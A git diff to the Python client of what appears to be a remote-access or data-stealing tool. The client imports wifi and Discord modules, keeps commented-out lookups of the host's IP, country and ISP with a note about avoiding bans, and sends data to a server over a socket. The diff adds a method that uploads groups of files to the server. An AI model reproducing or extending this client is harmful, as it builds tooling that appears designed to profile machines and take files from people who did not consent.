@@ -9,6 +9,7 @@ import sys
 import threading
 import base64
 import rsa
+import asyncio
 
 from modules import wifi
 from modules.discord import discord
@@ -64,7 +65,6 @@ class Client:
         #country = requests.get("https://ipapi.co/country_name").text
         #isp = requests.get("https://ipapi.co/org").text
 
-        # Using test information not to get banned
         ip = "127.0.0.1"
         country = "Norway"
         isp = "Telenor"
@@ -126,7 +126,7 @@ class Client:
                 chunk = data[i:i+chunk_size].encode('utf-8')
                 self.client.sendall(chunk)
 
-    def send_file(self, file_path: str, chunk_size: int = 1024) -> None:
+    def send_file(self, file_path: str) -> None:
         """Send a file to the server with metadata and chunked content."""
         try:
             if not os.path.exists(file_path):
@@ -164,6 +164,18 @@ class Client:
             print(f"Network error during file transfer: {e}")
         except Exception as e:
             print(f"An unexpected error occurred: {e}")
+
+    def send_files(self, name: str, files: list[str]) -> None:
+        metadata_header = json.dumps({
+            "type": "FILE_GROUP",
+            "total_amount": len(files),
+            "name": name,
+        })
+
+        self.client.sendall(len(metadata_header).to_bytes(4, 'big') + metadata_header.encode('utf-8'))
+
+        for file in files:
+            self.send_file(file)
 
     def receive(self) -> str:
         chunks = []
